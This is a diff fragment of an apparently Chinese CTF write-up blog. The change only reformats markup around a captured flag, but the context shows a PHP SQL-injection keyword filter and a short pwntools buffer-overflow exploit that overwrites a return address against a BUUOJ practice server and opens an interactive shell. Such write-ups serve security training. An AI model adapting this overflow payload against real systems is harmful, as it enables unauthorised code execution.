@@ -298,8 +298,8 @@ if(preg_match(&quot;/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/i&quot;,$id))<br
 <p>构造 exp</p>
 </div>
 <figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28395</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40060D</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png" alt="" /></p>
-<p class="bulr">得到 flag:<br />
-!! flag{a15dd406-0d79-4f49-b5a0-3dde546a4d3d}! !</p>
+<p>得到 flag:</p>
+<p class="bulr">!! flag{a15dd406-0d79-4f49-b5a0-3dde546a4d3d}! !</p>
 ]]></content>
       <categories>
         <category>wp</category>
